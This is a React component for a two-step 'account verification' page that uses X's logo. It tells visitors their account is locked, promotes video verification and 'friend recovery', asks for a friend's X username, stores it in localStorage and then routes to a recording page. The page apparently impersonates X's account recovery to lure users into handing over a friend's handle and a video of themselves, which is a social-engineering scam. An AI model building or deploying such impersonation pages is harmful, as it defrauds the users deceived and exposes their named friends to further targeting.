import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../contexts/LanguageContext'
import { getTranslation } from '../utils/translations'
import './VerificationStart.css'

function VerificationStart() {
  const navigate = useNavigate()
  const { language } = useLanguage()
  const [step, setStep] = useState(1)
  const [username, setUsername] = useState('')
  const t = (key) => getTranslation(language, key)

  useEffect(() => {
    const isLoggedIn = localStorage.getItem('isLoggedIn')
    if (!isLoggedIn) {
      alert(t('mustLoginFirst'))
      navigate('/login')
      return
    }
  }, [navigate, language])

  const handleContinue = () => {
    if (step === 1) {
      setStep(2)
    } else {
      // Save username to localStorage before navigating
      localStorage.setItem('friendUsername', username)
      navigate('/record')
    }
  }

  return (
    <div className="verification-page">
      <div className="verification-container">
        {step === 1 ? (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>
            
            <h1 className="verification-title">{t('welcomeToSecurity')}</h1>
            
            <p className="verification-description">
              {t('accountLocked')}
            </p>

            <div className="help-notice">
              <p className="help-text">
                {t('helpRecover')}
              </p>
            </div>

            <div className="info-box">
              <p className="info-header">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0" style={{marginRight: '8px'}}>
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                {t('processDetails')}
              </p>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>{t('videoVerification')}</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>{t('secureProcess')}</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>{t('supportFriendRecovery')}</span>
              </div>
            </div>

            <button className="btn-continue" onClick={handleContinue}>
              {t('continueBtn')}
            </button>

            <p className="privacy-note">
              {t('privacyAgreement')}
            </p>
          </div>
        ) : (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>

            <h1 className="verification-title">{t('enterFriendUsername')}</h1>
            
            <p className="verification-description">
              {t('friendUsernameDesc')}
            </p>

            <div className="input-group">
              <label htmlFor="username">{t('friendUsername')}</label>
              <div className="input-wrapper">
                <span className="input-prefix">@</span>
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder={t('friendUsernamePlaceholder')}
                  className="input-field"
                />
              </div>
            </div>

            <div className="help-box">
              <p>{t('verificationTerms')}</p>
              <ul>
                <li>{t('knowPersonally')}</li>
                <li>{t('supportingRecovery')}</li>
                <li>{t('accurateInfo')}</li>
              </ul>
            </div>

            <button 
              className="btn-continue" 
              onClick={handleContinue}
              disabled={!username.trim()}
            >
              {t('startVerification')}
            </button>

            <button className="btn-back" onClick={() => setStep(1)}>
              {t('back')}
            </button>
          </div>
        )}
      </div>
    </div>
  )
}

export default VerificationStart
